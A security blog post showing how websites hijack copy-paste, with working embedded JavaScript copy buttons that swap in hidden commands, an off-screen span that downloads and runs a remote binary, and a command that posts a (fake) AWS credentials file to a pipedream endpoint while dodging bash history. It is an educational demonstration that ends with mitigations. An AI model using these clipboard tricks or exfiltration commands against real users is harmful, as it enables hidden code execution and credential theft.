---
title: "Don't Trust Your Clipboard"
date: 2023-05-12
ShowToc: true
ShowDate: false
---

At first glance, copying and pasting code from the internet appears innocuous and is a daily practice. It's common to copy code from various online sources everyday without a second thought.

But just like phishing emails exploit our habit of clicking links, malicious code can exploit our habit of pasting snippets straight into the terminal.

This post will show you how. Every example here is safe to read but not safe to run.


---


## Arbitrary Code Execution

One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.

<center> <img src="/dont-trust-your-clipboard/rickrollbashcode.png"> </center> 

<center> <img src="/dont-trust-your-clipboard/rickroll.gif"> </center> 

Funny? Yes. Harmless? Mostly. But it proves a point: you just executed code without understanding it.

Many installation guides use commands like:

```bash
curl -L https://example.com/script.sh | bash
bash -c $(curl -fsSL https://example.com/script.sh)
```

A example of this is Homebrew.

<center> <img src="/dont-trust-your-clipboard/copy_select_brew.png"> </center> 

Let's examine the different methods of copying text that can lead to code execution, including copying via button and the traditional select, copy, and paste method.


---


## Copy Text Via Button

The copy button purpose is to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples where I have encountered the copy text button:

<center> <img src="/dont-trust-your-clipboard/copy_button_docs_aws.png"> </center> 

The examples above are not inherently harmful, but they lead individuals to trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.

<link rel="stylesheet" href="/dont-trust-your-clipboard/totallysafeandhelpful.css">

<div class="totallysafeandhelpful">

  **Welcome to totally-safe-and-helpful.blog**

  Today we are going to give you a couple of useful docker commands. You can copy all the commands into your terminal using the handy copy button!
  
  <div style="display: flex; align-items: center; width: 100%;">
    <div class="code nocopy" style="flex: 1;">
      docker rmi $(docker images -a -q)
    </div>
    <div class="code1">
      <button class="button" onclick="nefariousCopy()">
        <span>📋</span>
      </button>
    </div>
  </div>

</div>

<script>
  function nefariousCopy(n) {
    var dummy = document.createElement("textarea");
    document.body.appendChild(dummy);
    dummy.textContent = `curl -L https://nickstanley574.github.io/dont-trust-your-clipboard/ghostbusters \n`;
    dummy.select();
    document.execCommand("copy");
    document.body.removeChild(dummy);
  }
</script>

<video style="max-width: 100%;" controls>
  <source src="/dont-trust-your-clipboard/ghostbusters.webm">
</video>


You just got ghostbusted!

The copy button called a javascript function.

```html
<button class="button" onclick="nefariousCopy()"><span>📋</span></button>
```

The nefariousCopy function creates a dummy text element and selects its' contents. Using [`execCommand(copy)`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard) the dummy text is copied to the clipboard and the user is none the wiser.

```javascript
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io/dont-trust-your-clipboard/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
```

This is what is copied to the clipboard when the copy button is clicked:

```bash
curl -L https://nickstanley574.github.io/dont-trust-your-clipboard/ghostbusters \n
```

Using `select()` plus `execCommand()` is the way most copy buttons work, just instead of adding a dummy element, they select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.


---


## Select, Copy & Paste

Lets go back to Look at another post from  totally-safe-and-helpful.blog.

<div class="totallysafeandhelpful">

  **Welcome back to totally-safe-and-helpful.blog**

  Today we are going to explore how to find the files taking up all your harddisk space using the <b>du</b> command.

  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>

</div>

Seems safe enough; Looks like any other code snippet on the internet. You can see where this is going. All aboard 🚂 !

<video style="max-width: 100%;"  controls>
  <source src="/dont-trust-your-clipboard/choochoo.webm">
</video>


```html
<div class="code">
  du -hs *
  <span style="position: absolute; top: -200px; left: -200px;">
  "; curl -s -L https://nickstanley574.github.io/assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;"
  <br>
  du -hs *
  </span>
  | sort -rh | head -5
</div>
```

This time the bad actor used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example: Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.

```html
<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
```

This allows us to add style to text, but the browser allows the copy without the the format applied. The `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left corner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.

```shell
du -hs *; \
curl -s -L https://nickstanley574.github.io/assets/posts/dont-trust-your-clipboard/sl --output sl; \
chmod +x sl; \
./sl; \
clear; \
du -hs * | sort -rh | head -5

```

The curl downloads a file, makes it executable, runs it.


---


## Composing the Attacks


### Attack Avenue 1: sudo Timing

The sudo command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run with elevated privilege.  When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.

```
nick /home $ sudo apt-get install apache2
[sudo] password for nick:
Reading package lists... Done
...
nick /home $ sudo apt-get install nginx
Reading package lists... Done
```

Notice for the second `sudo` command it didn't require a password. The `sudo` command has a `timestamp_timeout` feature that specifies the amount of time that can pass before `sudo` asks for a password again. This allows users to execute multiple privileged commands in a short period without having to repeatedly enter their password. The default value for this feature is 5 minutes.

Hackers can start by initiating a genuine sudo command that prompts the user for their password, and then proceed to execute a hidden malicious command during copy and paste using the subsequent sudo command. This could result in the installation of spyware or ransomware on the system, among other actions.


### Attack Avenue 2: Stealing AWS Credentials

AWS credentials are stored in plaintext and is normally owned by the current user in that user's home folder, by default the path is `~/.aws/credentials`. When the user is the owner, then there's no need to use sudo to access these credentials. As a result, any process executed under the user's account would be able to gain access to these confidential information. 

To demonstrate this we are going to use RequestBin. RequestBin is a web-based tool that allows you to inspect and debug HTTP requests. It provides a unique URL that you can use to send HTTP requests to, and then allows you to inspect the request in real-time. 

For this exercise there is AWS creds for the `james007` is located in `~/.aws/credentials-fake`. And James found the following from totally-safe-and-helpful.blog.

<div class="totallysafeandhelpful">
  <div style="display: flex; align-items: center; width: 100%;">
    <div class="code nocopy" style="flex: 1;">
      top -d 0.25 -c
    </div>
    <div class="code1">
      <button class="button" onclick="nefariousCopy2()">
        <span>📋</span>
      </button>
    </div>
  </div>
</div>

<script>
function nefariousCopy2(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = ` curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/ > /dev/null; clear; top -d 0.25 -c; clear; \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script> 


The copy button will copy the following command.

```bash
curl -s -d "$(cat ~/.aws/credentials-fake)" https://envbrzdr9hp9.x.pipedream.net/
> /dev/null; top -d 0.25 -c; clear;
```


There are some subtleties to this commands that we should explore. Notice the space between the extra `$` prompt and the command itself. This will prevent the command from being saved to your bash history ([See HISTCONTROL](https://ss64.com/bash/history.html)). This means that the command will seffnd the contents of the aws cred file to the RequestBin/pipedream endpoint, run the expect command, then clear terminal window, and nothing will be saved to the bash history.

<video style="max-width: 100%;"  controls>
  <source src="/dont-trust-your-clipboard/steal-aws-creds.webm">
</video>

The ony indication that something is off is the terminal being cleared and the command is still copied to the clipboard. For a use to realize they have been compromised they would have to recognize the terminal clear being unusual before the copy something else to the clipboard. 


---


## Where do we go from here? 

To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.

In a enterprise environment, another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repos, and other external resources be in some type of internal artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 

Sharing code is amazing, but just like everything else be safe, be responsible, and be smart.